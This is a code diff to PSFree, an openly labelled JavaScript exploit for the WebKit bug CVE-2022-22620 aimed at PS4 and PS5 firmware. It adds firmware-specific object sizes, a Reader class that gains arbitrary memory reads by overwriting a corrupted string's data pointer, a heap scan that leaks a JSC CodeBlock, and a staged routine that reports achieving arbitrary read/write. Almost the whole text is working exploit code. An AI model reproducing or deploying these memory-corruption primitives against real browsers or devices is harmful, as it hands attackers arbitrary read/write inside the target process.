@@ -1,8 +1,100 @@
+/* Copyright (C) 2025 anonymous
+
+This file is part of PSFree.
+
+PSFree is free software: you can redistribute it and/or modify
+it under the terms of the GNU Affero General Public License as
+published by the Free Software Foundation, either version 3 of the
+License, or (at your option) any later version.
+
+PSFree is distributed in the hope that it will be useful,
+but WITHOUT ANY WARRANTY; without even the implied warranty of
+MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+GNU Affero General Public License for more details.
+
+You should have received a copy of the GNU Affero General Public License
+along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
+
+// PSFree is a WebKit exploit using CVE-2022-22620 to gain arbitrary read/write
+//
+// vulnerable:
+// * PS4 [6.00, 10.00)
+// * PS5 [1.00, 6.00)
+//
+// * CelesteBlue from ps4-dev on discord.com
+//   * Helped in figuring out the size of WebCore::SerializedScriptValue and
+//     its needed offsets on different firmwares.
+//   * figured out the range of vulnerable firmwares
+// * janisslsm from ps4-dev on discord.com
+//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
+//     needed offsets on different firmwares.
+// * Kameleon_ from ps4-dev on discord.com - tester
+// * SlidyBat from PS5 R&D discord.com
+//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
+//     needed offsets on different firmwares (PS5).
+
 const num_reuses = 0x300;
+
+var ssv_len;
+
+function Init_PSFreeGlobals() {
+  if (config_target < 0x650)
+    ssv_len = 0x58;
+  else if (config_target < 0x900)
+    ssv_len = 0x48;
+  else
+    ssv_len = 0x50;
+}
+
+function sread64(str, offset) {
+  const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
+  const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
+  return new Int(low, high);
+}
+
+class Reader {
+  constructor(rstr, rstr_view) {
+    this.rstr = rstr;
+    this.rstr_view = rstr_view;
+    this.m_data = rstr_view.read64(off_strimpl_m_data);
+  }
+  read8_at(offset) {
+    return this.rstr.charCodeAt(offset);
+  }
+  read32_at(offset) {
+    const str = this.rstr;
+    return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
+  }
+  read64_at(offset) {
+    return sread64(this.rstr, offset);
+  }
+  read64(addr) {
+    this.rstr_view.write64(off_strimpl_m_data, addr);
+    return sread64(this.rstr, 0);
+  }
+  set_addr(addr) {
+    this.rstr_view.write64(off_strimpl_m_data, addr);
+  }
+  // remember to use this to fix up the StringImpl before freeing it
+  restore() {
+    this.rstr_view.write64(off_strimpl_m_data, this.m_data);
+    const original_strlen = ssv_len - off_size_strimpl;
+    this.rstr_view.write32(off_strimpl_strlen, original_strlen);
+  }
+}
+//================================================================================================
+// LEAK CODE BLOCK ===============================================================================
+//================================================================================================
+// we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
+// of JSValues whose size is ssv_len. the undefined constant is automatically
+// added due to reasons such as "undefined is returned by default if the
+// function exits without returning anything"
 async function leak_code_block(reader, bt_size) {
   const num_leaks = 0x100;
   const rdr = reader;
   const bt = [];
+  // take into account the cell and indexing header of the immutable
+  // butterfly
   for (var i = 0; i < bt_size - 0x10; i += 8) {
     bt.push(i);
   }
@@ -29,6 +121,9 @@ async function leak_code_block(reader, bt_size) {
     chunkSize = 1 * MB;
   const smallPageSize = 4 * KB;
   const search_addr = align(rdr.m_data, chunkSize);
+  //log(`search addr: ${search_addr}`);
+  //log(`func_src:\n${cache[0]}\nfunc_src end`);
+  //log('start find CodeBlock');
   var winning_off = null;
   var winning_idx = null;
   var winning_f = null;
@@ -51,6 +146,9 @@ async function leak_code_block(reader, bt_size) {
         }
         rdr.set_addr(rdr.read64_at(i + strs_offset));
         const m_type = rdr.read8_at(5);
+        // make sure we're not reading the constant registers of an
+        // UnlinkedCodeBlock. those have JSTemplateObjectDescriptors.
+        // CodeBlock converts those to JSArrays
         if (m_type !== 0) {
           rdr.set_addr(search_addr);
           winning_off = i;
@@ -66,6 +164,9 @@ async function leak_code_block(reader, bt_size) {
     gc();
     await sleep();
   }
+  //log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
+  //log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
+  //log('CodeBlock.m_constantRegisters.m_buffer:');
   rdr.set_addr(search_addr.add(winning_off));
   //for (var i = 0; i < slen; i += 8) {
   //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
@@ -560,7 +661,7 @@ async function doPSFreeExploit() {
     window.log("PSFree STAGE 3/3: Achieve Arbitrary Read/Write Primitive");
     await sleep(50); // Wait 50ms
     await make_arw(rdr, view2, pop);
-    window.log("Achieved Arbitrary R/W");
+    window.log("Achieved Arbitrary R/W\n");
   } catch (error) {
     window.log("Error di PSFree\nTekan tombol Options stik, pilih Refresh...\nError definition: " + error, "red");
     return 0;
